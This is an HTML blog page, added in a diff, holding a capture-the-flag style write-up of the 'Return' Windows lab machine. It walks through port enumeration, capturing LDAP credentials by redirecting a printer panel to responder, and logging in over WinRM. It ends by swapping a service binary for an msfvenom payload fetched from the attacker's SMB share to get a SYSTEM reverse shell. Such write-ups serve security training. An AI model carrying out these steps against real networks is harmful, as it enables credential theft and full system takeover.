@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>CentHack | Welcome to my blog!!</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="CentHack" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Welcome to my blog!!" />
+<meta property="og:description" content="Welcome to my blog!!" />
+<link rel="canonical" href="http://localhost:4000/pages/writeups/return.html" />
+<meta property="og:url" content="http://localhost:4000/pages/writeups/return.html" />
+<meta property="og:site_name" content="CentHack" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="CentHack" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Welcome to my blog!!","headline":"CentHack","url":"http://localhost:4000/pages/writeups/return.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>CentHack</h1>
+        </a>
+        <h2>Welcome to my blog!!</h2>
+
+        <section id="downloads">
+          
+          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h1 id="return">Return</h1>
+
+<h1 id="enumeration">Enumeration</h1>
+
+<p>Scanner reported the following open ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE       REASON  VERSION
+53/tcp    open  domain        syn-ack Simple DNS Plus
+80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: HTB Printer Admin Panel
+88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2023-11-08 11:03:06Z<span class="o">)</span>
+135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: <span class="k">return</span>.local0., Site: Default-First-Site-Name<span class="o">)</span>
+445/tcp   open  microsoft-ds? syn-ack
+464/tcp   open  kpasswd5?     syn-ack
+593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped    syn-ack
+3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: <span class="k">return</span>.local0., Site: Default-First-Site-Name<span class="o">)</span>
+3269/tcp  open  tcpwrapped    syn-ack
+5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49671/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49674/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+49675/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49679/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49682/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49697/tcp open  msrpc         syn-ack Microsoft Windows RPC
+59728/tcp open  msrpc         syn-ack Microsoft Windows RPC
+</code></pre></div></div>
+
+<h3 id="port-80">Port 80</h3>
+
+<p>We will enumerate first the service that is not part of an Active Directory envirnoment.</p>
+
+<p>Visiting the webpage we can see that is an administration panal for a printer. But we will leave this for later.</p>
+
+<p><img src="Return%20(AD)%2059a3ed5d7d9642b1bb67fa9d08cdc896/Untitled.png" alt="Untitled" /></p>
+
+<h3 id="port-135">Port 135</h3>
+
+<ul>
+  <li>RPC</li>
+  <li>Need credentials</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/return/enumeration]
+└─<span class="nv">$ </span>rpcclient <span class="nt">-U</span> <span class="s1">'%'</span> 10.10.11.108
+rpcclient <span class="nv">$&gt;</span> enumdomusers
+result was NT_STATUS_ACCESS_DENIED
+</code></pre></div></div>
+
+<h3 id="port-139445">Port 139/445</h3>
+
+<ul>
+  <li>SMB</li>
+  <li>Need credentials</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/return/enumeration]
+└─<span class="nv">$ </span>crackmapexec smb 10.10.11.108 <span class="nt">-u</span> <span class="s1">'%'</span> <span class="nt">-p</span> <span class="s1">'%'</span>  <span class="nt">--shares</span>   
+SMB         10.10.11.108    445    PRINTER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:PRINTER<span class="o">)</span> <span class="o">(</span>domain:return.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.11.108    445    PRINTER          <span class="o">[</span>-] <span class="k">return</span>.local<span class="se">\%</span>:% STATUS_LOGON_FAILURE 
+                                                                                                                                                                                                                                            
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/return/enumeration]
+└─<span class="nv">$ </span>smbclient <span class="nt">-L</span> <span class="se">\\\\</span>10.10.11.108<span class="se">\\</span> <span class="nt">-N</span>
+Anonymous login successful
+
+        Sharename       Type      Comment
+        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+Reconnecting with SMB1 <span class="k">for </span>workgroup listing.
+do_connect: Connection to 10.10.11.108 failed <span class="o">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span class="o">)</span>
+Unable to connect with SMB1 <span class="nt">--</span> no workgroup available
+</code></pre></div></div>
+
+<h3 id="port-389">Port 389</h3>
+
+<ul>
+  <li>LDAP</li>
+  <li>Need credentials</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/return/enumeration]
+└─<span class="nv">$ </span>ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://10.10.11.108 <span class="nt">-b</span> <span class="s2">"DC=return,DC=local"</span>     
+<span class="c"># extended LDIF</span>
+<span class="c">#</span>
+<span class="c"># LDAPv3</span>
+<span class="c"># base &lt;DC=return,DC=local&gt; with scope subtree</span>
+<span class="c"># filter: (objectclass=*)</span>
+<span class="c"># requesting: ALL</span>
+<span class="c">#</span>
+
+<span class="c"># search result</span>
+search: 2
+result: 1 Operations error
+text: 000004DC: LdapErr: DSID-0C090A37, comment: In order to perform this opera
+ tion a successful <span class="nb">bind </span>must be completed on the connection., data 0, v4563
+
+<span class="c"># numResponses: 1</span>
+</code></pre></div></div>
+
+<p>In the web page  we could try to change the server address to point to us and setup <strong>responder</strong> to see if we capture something.</p>
+
+<ul>
+  <li>Server Address → 10.10.14.12</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>LDAP] Cleartext Client   : 10.10.11.108
+<span class="o">[</span>LDAP] Cleartext Username : <span class="k">return</span><span class="se">\s</span>vc-printer
+<span class="o">[</span>LDAP] Cleartext Password : 1edFg43012!!
+</code></pre></div></div>
+
+<p>Indeed we have receive credentials for user svc-printer.</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">svc-printer:1edFg43012!!</code></li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>crackmapexec winrm 10.10.11.108 <span class="nt">-u</span> <span class="s1">'svc-printer'</span>  <span class="nt">-p</span> <span class="s1">'1edFg43012!!'</span>         
+SMB         10.10.11.108    5985   PRINTER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 <span class="o">(</span>name:PRINTER<span class="o">)</span> <span class="o">(</span>domain:return.local<span class="o">)</span>
+HTTP        10.10.11.108    5985   PRINTER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.11.108:5985/wsman
+WINRM       10.10.11.108    5985   PRINTER          <span class="o">[</span>+] <span class="k">return</span>.local<span class="se">\s</span>vc-printer:1edFg43012!! <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+
+<p>We can use them to connect to the machine.</p>
+
+<h1 id="foothold">Foothold</h1>
+
+<p>In this phase we will enumerate again the domain, but this time we have valid credentials.</p>
+
+<h3 id="smb">SMB</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/return]
+└─<span class="nv">$ </span>crackmapexec smb 10.10.11.108 <span class="nt">-u</span> <span class="s1">'svc-printer'</span>  <span class="nt">-p</span> <span class="s1">'1edFg43012!!'</span> <span class="nt">--shares</span>
+SMB         10.10.11.108    445    PRINTER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:PRINTER<span class="o">)</span> <span class="o">(</span>domain:return.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.11.108    445    PRINTER          <span class="o">[</span>+] <span class="k">return</span>.local<span class="se">\s</span>vc-printer:1edFg43012!! 
+SMB         10.10.11.108    445    PRINTER          <span class="o">[</span>+] Enumerated shares
+SMB         10.10.11.108    445    PRINTER          Share           Permissions     Remark
+SMB         10.10.11.108    445    PRINTER          <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
+SMB         10.10.11.108    445    PRINTER          ADMIN<span class="nv">$ </span>         READ            Remote Admin
+SMB         10.10.11.108    445    PRINTER          C<span class="nv">$ </span>             READ,WRITE      Default share
+SMB         10.10.11.108    445    PRINTER          IPC<span class="nv">$ </span>           READ            Remote IPC
+SMB         10.10.11.108    445    PRINTER          NETLOGON        READ            Logon server share 
+SMB         10.10.11.108    445    PRINTER          SYSVOL          READ            Logon server share
+</code></pre></div></div>
+
+<h3 id="rpc">RPC</h3>
+
+<ul>
+  <li>We can enumerate from RPC</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/return]
+└─<span class="nv">$ </span>rpcclient <span class="nt">-U</span> <span class="s1">'svc-printer'</span> 10.10.11.108
+Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\s</span>vc-printer]:
+rpcclient <span class="nv">$&gt;</span> enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[svc-printer] rid:[0x44f]
+</code></pre></div></div>
+
+<h3 id="ldap">LDAP</h3>
+
+<ul>
+  <li>We can enumerate from LDAP</li>
+</ul>
+
+<p>We can connect using evil-winrm</p>
+
+<h1 id="privilege-escalation">Privilege escalation</h1>
+
+<p>Our user is part of the Server Operators group. This means that we probably have the capability to  modify and restart services.</p>
+
+<p>First we list the services running in the machine</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>ocuments&gt; services
+
+Path                                                                                                                 Privileges Service          
+<span class="nt">----</span>                                                                                                                 <span class="nt">----------</span> <span class="nt">-------</span>          
+C:<span class="se">\W</span>indows<span class="se">\A</span>DWS<span class="se">\M</span>icrosoft.ActiveDirectory.WebServices.exe                                                                  True ADWS             
+<span class="se">\?</span>?<span class="se">\C</span>:<span class="se">\P</span>rogramData<span class="se">\M</span>icrosoft<span class="se">\W</span>indows Defender<span class="se">\D</span>efinition Updates<span class="se">\{</span>5533AFC7-64B3-4F6E-B453-E35320B35716<span class="o">}</span><span class="se">\M</span>pKslDrv.sys       True MpKslceeb2796    
+C:<span class="se">\W</span>indows<span class="se">\M</span>icrosoft.NET<span class="se">\F</span>ramework64<span class="se">\v</span>4.0.30319<span class="se">\S</span>MSvcHost.exe                                                              True NetTcpPortSharing
+C:<span class="se">\W</span>indows<span class="se">\S</span>ysWow64<span class="se">\p</span>erfhost.exe                                                                                           True PerfHost         
+<span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogram Files</span><span class="se">\W</span><span class="s2">indows Defender Advanced Threat Protection</span><span class="se">\M</span><span class="s2">sSense.exe"</span>                                                False Sense            
+C:<span class="se">\W</span>indows<span class="se">\s</span>ervicing<span class="se">\T</span>rustedInstaller.exe                                                                                 False TrustedInstaller 
+<span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogram Files</span><span class="se">\V</span><span class="s2">Mware</span><span class="se">\V</span><span class="s2">Mware Tools</span><span class="se">\V</span><span class="s2">Mware VGAuth</span><span class="se">\V</span><span class="s2">GAuthService.exe"</span>                                                     True VGAuthService    
+<span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogram Files</span><span class="se">\V</span><span class="s2">Mware</span><span class="se">\V</span><span class="s2">Mware Tools</span><span class="se">\v</span><span class="s2">mtoolsd.exe"</span>                                                                        True VMTools          
+<span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogramData</span><span class="se">\M</span><span class="s2">icrosoft</span><span class="se">\W</span><span class="s2">indows Defender</span><span class="se">\p</span><span class="s2">latform</span><span class="se">\4</span><span class="s2">.18.2104.14-0</span><span class="se">\N</span><span class="s2">isSrv.exe"</span>                                             True WdNisSvc         
+<span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogramData</span><span class="se">\M</span><span class="s2">icrosoft</span><span class="se">\W</span><span class="s2">indows Defender</span><span class="se">\p</span><span class="s2">latform</span><span class="se">\4</span><span class="s2">.18.2104.14-0</span><span class="se">\M</span><span class="s2">sMpEng.exe"</span>                                            True WinDefend        
+<span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogram Files</span><span class="se">\W</span><span class="s2">indows Media Player</span><span class="se">\w</span><span class="s2">mpnetwk.exe"</span>                                                                      False WMPNetworkSvc
+</code></pre></div></div>
+
+<p>Checking these services one by one we can see if can modify any of theme</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>ocuments&gt; Get-Acl <span class="nt">-Path</span> hklm:<span class="se">\S</span>ystem<span class="se">\C</span>UrrentControlSet<span class="se">\s</span>ervices<span class="se">\V</span>MTOols | format-list
+
+Path   : Microsoft.PowerShell.Core<span class="se">\R</span>egistry::HKEY_LOCAL_MACHINE<span class="se">\S</span>ystem<span class="se">\C</span>UrrentControlSet<span class="se">\s</span>ervices<span class="se">\V</span>MTOols
+Owner  : BUILTIN<span class="se">\A</span>dministrators
+Group  : NT AUTHORITY<span class="se">\S</span>YSTEM
+Access : NT AUTHORITY<span class="se">\A</span>uthenticated Users Allow  ReadKey
+         NT AUTHORITY<span class="se">\A</span>uthenticated Users Allow  <span class="nt">-2147483648</span>
+         BUILTIN<span class="se">\S</span>erver Operators Allow  SetValue, CreateSubKey, Delete, ReadKey
+         BUILTIN<span class="se">\S</span>erver Operators Allow  <span class="nt">-1073676288</span>
+         BUILTIN<span class="se">\A</span>dministrators Allow  FullControl
+         BUILTIN<span class="se">\A</span>dministrators Allow  268435456
+         NT AUTHORITY<span class="se">\S</span>YSTEM Allow  FullControl
+         NT AUTHORITY<span class="se">\S</span>YSTEM Allow  268435456
+         CREATOR OWNER Allow  268435456
+         APPLICATION PACKAGE AUTHORITY<span class="se">\A</span>LL APPLICATION PACKAGES Allow  ReadKey
+         APPLICATION PACKAGE AUTHORITY<span class="se">\A</span>LL APPLICATION PACKAGES Allow  <span class="nt">-2147483648</span>
+         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow  ReadKey
+         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow  <span class="nt">-2147483648</span>
+Audit  :
+Sddl   : O:BAG:SYD:AI<span class="o">(</span>A<span class="p">;</span>ID<span class="p">;</span>KR<span class="p">;;;</span>AU<span class="o">)(</span>A<span class="p">;</span>CIIOID<span class="p">;</span>GR<span class="p">;;;</span>AU<span class="o">)(</span>A<span class="p">;</span>ID<span class="p">;</span>CCDCLCSWRPSDRC<span class="p">;;;</span>SO<span class="o">)(</span>A<span class="p">;</span>CIIOID<span class="p">;</span>SDGWGR<span class="p">;;;</span>SO<span class="o">)(</span>A<span class="p">;</span>ID<span class="p">;</span>KA<span class="p">;;;</span>BA<span class="o">)(</span>A<span class="p">;</span>CIIOID<span class="p">;</span>GA<span class="p">;;;</span>BA<span class="o">)(</span>A<span class="p">;</span>ID<span class="p">;</span>KA<span class="p">;;;</span>SY<span class="o">)(</span>A<span class="p">;</span>CIIOID<span class="p">;</span>GA<span class="p">;;;</span>SY<span class="o">)(</span>A<span class="p">;</span>CIIOID<span class="p">;</span>GA<span class="p">;;;</span>CO<span class="o">)(</span>A<span class="p">;</span>ID<span class="p">;</span>KR<span class="p">;;;</span>AC<span class="o">)(</span>A<span class="p">;</span>CIIOID<span class="p">;</span>GR<span class="p">;;;</span>AC<span class="o">)(</span>A<span class="p">;</span>ID<span class="p">;</span>KR<span class="p">;;;</span>S-1-15-3-1024-106536593
+         6-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681<span class="o">)(</span>A<span class="p">;</span>CIIOID<span class="p">;</span>GR<span class="p">;;;</span>S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Now we need to know if the service run as root or not.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>ocuments&gt; cmd.exe /c <span class="s2">"sc qc vmtools"</span>
+<span class="o">[</span>SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: vmtools
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : <span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogram Files</span><span class="se">\V</span><span class="s2">Mware</span><span class="se">\V</span><span class="s2">Mware Tools</span><span class="se">\v</span><span class="s2">mtoolsd.exe"</span>
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : VMware Tools
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+</code></pre></div></div>
+
+<p>We see LocalSystem, so it root who run the service.</p>
+
+<ul>
+  <li>First modify the executable of the service with a msfvenom generated payload.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>ocuments&gt; copy <span class="se">\\</span>10.10.14.12<span class="se">\s</span>hare<span class="se">\s</span>hell.exe <span class="nb">.</span>
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>ocuments&gt; cmd.exe /c <span class="s2">"sc config vmtools binpath='C:</span><span class="se">\U</span><span class="s2">sers</span><span class="se">\s</span><span class="s2">vc-printer</span><span class="se">\D</span><span class="s2">ocuments</span><span class="se">\s</span><span class="s2">hell.exe'"</span>
+<span class="o">[</span>SC] ChangeServiceConfig SUCCESS
+</code></pre></div></div>
+
+<ul>
+  <li>Set up a listener and restart the service</li>
+</ul>
+
+<p>I’ve got an error that says <strong>The system cannot find the file specified</strong>, to solve I simply move the payload to another location in the system until it worked.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>ocuments&gt; cmd.exe /c <span class="s1">'sc config vmtools binpath="C:\shell.exe"'</span>
+<span class="o">[</span>SC] ChangeServiceConfig SUCCESS
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>ocuments&gt; cmd.exe /c <span class="s2">"sc start vmtools"</span>
+</code></pre></div></div>
+
+<p>Finally we have a shell as root.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/tools]
+└─<span class="nv">$ </span>nc <span class="nt">-lvnp</span> 443                                                                                                                                                         
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.12] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.108] 62215
+Microsoft Windows <span class="o">[</span>Version 10.0.17763.107]
+<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
+<span class="nb">whoami
+</span>nt authority<span class="se">\s</span>ystem
+</code></pre></div></div>
+
+      </section>
+    </div>
+  </body>
+</html>
